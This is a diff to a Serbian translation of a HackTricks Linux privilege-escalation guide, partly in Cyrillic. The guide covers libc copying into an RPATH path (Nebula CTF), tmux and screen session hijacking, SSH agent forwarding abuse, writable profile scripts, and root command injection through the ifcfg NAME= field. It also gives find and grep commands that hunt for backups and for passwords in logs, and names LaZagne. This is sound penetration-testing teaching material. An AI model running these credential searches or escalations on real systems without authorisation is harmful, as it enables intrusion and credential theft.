+Kopiranjem lib-a u `/var/tmp/flag15/` biće korišćen od strane programa na ovom mestu kao što je navedeno u `RPATH` varijabli.
 ```
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
@@ -1063,7 +1063,7 @@ execve(file,argv,0);
 ```
 ## Capabilities
 
-Linux capabilities provide a **podskup dostupnih root privilegija za proces**. This effectively breaks up root **privilegije na manje i prepoznatljive jedinice**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
+Linux capabilities provide a **podskup dostupnih root privilegija procesu**. This effectively breaks up root **privilegije na manje i prepoznatljive jedinice**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
 Read the following page to **saznajte više o sposobnostima i kako ih zloupotrebiti**:
 
 {% content-ref url="linux-capabilities.md" %}
@@ -1112,7 +1112,7 @@ screen -x [user]/[session id]
 ```
 ## tmux sessions hijacking
 
-Ovo je bio problem sa **starim verzijama tmux-a**. Nije mi bilo moguće da preuzmem tmux (v2.1) sesiju koju je kreirao root kao korisnik bez privilegija.
+Ovo je bio problem sa **starim verzijama tmux-a**. Nisam mogao da preuzmem tmux (v2.1) sesiju koju je kreirao root kao korisnik bez privilegija.
 
 **List tmux sessions**
 ```bash
@@ -1158,7 +1158,7 @@ Određuje da li root može da se prijavi koristeći ssh, podrazumevano je `no`. 
 
 ### AuthorizedKeysFile
 
-Određuje datoteke koje sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može sadržati tokene kao što su `%h`, koji će biti zamenjeni sa kućnim direktorijumom. **Možete naznačiti apsolutne putanje** (počinjući od `/`) ili **relativne putanje od korisničkog doma**. Na primer:
+Određuje datoteke koje sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može sadržati tokene kao što su `%h`, koji će biti zamenjeni sa home direktorijumom. **Možete naznačiti apsolutne putanje** (počinjući od `/`) ili **relativne putanje od korisnikovog home direktorijuma**. Na primer:
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
@@ -1173,22 +1173,22 @@ Morate postaviti ovu opciju u `$HOME/.ssh.config` ovako:
 Host example.com
 ForwardAgent yes
 ```
-Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).
+Napomena da ako je `Host` `*`, svaki put kada korisnik pređe na drugu mašinu, ta mašina će moći da pristupi ključevima (što je bezbednosni problem).
 
-The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
-The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).
+Datoteka `/etc/ssh_config` može **prepisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
+Datoteka `/etc/sshd_config` može **dozvoliti** ili **zabraniti** prosleđivanje ssh-agenta sa ključnom rečju `AllowAgentForwarding` (podrazumevano je dozvoljeno).
 
-If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:
+Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda možete da ga zloupotrebite za eskalaciju privilegija**:
 
 {% content-ref url="ssh-forward-agent-exploitation.md" %}
 [ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
 {% endcontent-ref %}
 
-## Interesting Files
+## Zanimljive datoteke
 
-### Profiles files
+### Datoteke profila
 
-The file `/etc/profile` and the files under `/etc/profile.d/` are **skripte koje se izvršavaju kada korisnik pokrene novu ljusku**. Stoga, ako možete **da pišete ili modifikujete bilo koji od njih, možete eskalirati privilegije**.
+Datoteka `/etc/profile` i datoteke pod `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu ljusku**. Stoga, ako možete **da pišete ili modifikujete bilo koju od njih, možete eskalirati privilegije**.
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
@@ -1299,15 +1299,15 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
-### Poznati fajlovi koji sadrže lozinke
+### Познати фајлови који садрже лозинке
 
-Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **several possible files that could contain passwords**.\
-**Još jedan zanimljiv alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je aplikacija otvorenog koda korišćena za preuzimanje mnogih lozinki sačuvanih na lokalnom računaru za Windows, Linux i Mac.
+Прочитајте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), он трага за **неколико могућих фајлова који би могли садржати лозинке**.\
+**Још један интересантан алат** који можете користити за то је: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) који је апликација отвореног кода коришћена за преузимање великог броја лозинки сачуваних на локалном рачунару за Windows, Linux и Mac.
 
-### Logovi
+### Логови
 
-Ako možete da čitate logove, možda ćete moći da pronađete **interesting/confidential information inside them**. Što je log čudniji, to će biti zanimljiviji (verovatno).\
-Takođe, neki "**bad**" konfigurisan (backdoored?) **audit logs** mogu vam omogućiti da **record passwords** unutar audit logova kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+Ако можете читати логове, можда ћете моћи да пронађете **интересантне/поверљиве информације унутар њих**. Што је лог чуднији, то ће бити интересантнији (вероватно).\
+Такође, неки "**лоше**" конфигурисани (позадински?) **аудит логови** могу вам омогућити да **записујете лозинке** унутар аудит логова као што је објашњено у овом посту: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
@@ -1327,7 +1327,7 @@ Da biste **čitali logove, grupa** [**adm**](interesting-groups-linux-pe/#adm-gr
 ```
 ### Generic Creds Search/Regex
 
-Takođe treba da proverite datoteke koje sadrže reč "**password**" u svom **imenu** ili unutar **sadržaja**, kao i da proverite IP adrese i emailove unutar logova, ili hash regex-ove.\
+Trebalo bi da proverite datoteke koje sadrže reč "**password**" u svom **imenu** ili unutar **sadržaja**, kao i da proverite IP adrese i emailove unutar logova, ili regexove za hashove.\
 Neću ovde nabrajati kako da uradite sve ovo, ali ako ste zainteresovani, možete proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) vrši.
 
 ## Writable files
@@ -1352,7 +1352,7 @@ Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tec
 
 Možete iskoristiti ovu ranljivost sa [**logrotten**](https://github.com/whotwagner/logrotten).
 
-Ova ranljivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logovi),** tako da kada god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete povećati privilegije zamenom logova simboličkim linkovima.
+Ova ranljivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logovi),** tako da kada god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete povećati privilegije zamenjujući logove simboličkim linkovima.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
@@ -1362,7 +1362,7 @@ Ako, iz bilo kog razloga, korisnik može da **piše** `ifcf-<bilo šta>` skriptu
 
 Mrežne skripte, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su \~sourced\~ na Linuxu od strane Network Manager-a (dispatcher.d).
 
-U mom slučaju, `NAME=` atribut u ovim mrežnim skriptama nije pravilno obrađen. Ako imate **bele/prazne prostore u imenu, sistem pokušava da izvrši deo nakon belog/praznog prostora**. To znači da se **sve nakon prvog praznog prostora izvršava kao root**.
+U mom slučaju, `NAME=` atribut u ovim mrežnim skriptama nije pravilno obrađen. Ako imate **prazan prostor u imenu, sistem pokušava da izvrši deo nakon praznog prostora**. To znači da se **sve nakon prvog praznog prostora izvršava kao root**.
 
 Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
 ```bash
@@ -1448,11 +1448,11 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Podrška HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
